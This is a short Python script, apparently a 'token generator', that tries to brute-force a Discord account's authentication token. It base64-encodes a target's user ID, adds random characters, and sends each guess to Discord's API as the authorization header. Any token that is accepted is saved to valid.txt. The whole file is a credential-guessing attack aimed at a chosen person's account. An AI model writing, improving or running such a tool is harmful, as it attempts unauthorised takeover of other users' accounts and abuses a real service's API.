import base64
import random
import requests

# Check if id.txt exists and get the user ID from it if it does
try:
    with open("id.txt", "r") as f:
        user_id = f.read().strip()
except FileNotFoundError:
    user_id = input("Enter a Discord user ID: ")

while True:
    # Encode the user ID in base64
    b64_user_id = base64.b64encode(user_id.encode()).decode()

    # Generate a random token
    token = f"{b64_user_id}.{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5))}.{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=27))}"

    # Send a request to the Discord API with the token as the authorization header
    headers = {"Content-Type": "application/json", "authorization": token}
    response = requests.get("https://discordapp.com/api/v6/users/@me/library", headers=headers)

    # Check the response status code
    if response.status_code == 200:
        # If the status code is 200, the token is valid, so write it to valid.txt and exit
        with open("valid.txt", "a") as f:
            f.write(f"{token}\n")
        print(f"Token {token} is valid.")
        break
    else:
        # If the status code is not 200, the token is invalid
        if "rate limited" in response.text:
            # If the response contains "rate limited", exit the program
            print("API rate limit reached. Please try again later.")
            break
        else:
            # If the response does not contain "rate limited", print the error message and repeat the token generation process
            print(f"Token {token} is invalid.")
            try:
                error_message = response.json()["message"]
            except:
                error_message = response.text
            print(f"Error message: {error_message}")